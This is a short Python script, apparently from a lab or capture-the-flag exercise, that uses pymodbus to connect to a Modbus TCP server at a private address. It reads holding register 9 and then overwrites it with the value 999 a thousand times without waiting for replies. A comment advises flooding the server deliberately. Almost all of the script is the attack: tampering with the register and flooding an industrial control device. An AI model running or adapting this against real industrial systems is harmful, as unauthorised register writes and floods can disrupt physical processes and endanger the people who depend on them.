from pymodbus.client import *

client = ModbusTcpClient("172.18.7.2", port=5020)

resp = client.read_holding_registers(9) 
print(resp.registers)

# it's probably good to flood the server, even if you know it only takes 50 requests (which you wouldn't)
for i in range(1000):
    client.write_register(9, 999, no_response_expected=True)

resp = client.read_holding_registers(9)
print(resp.registers)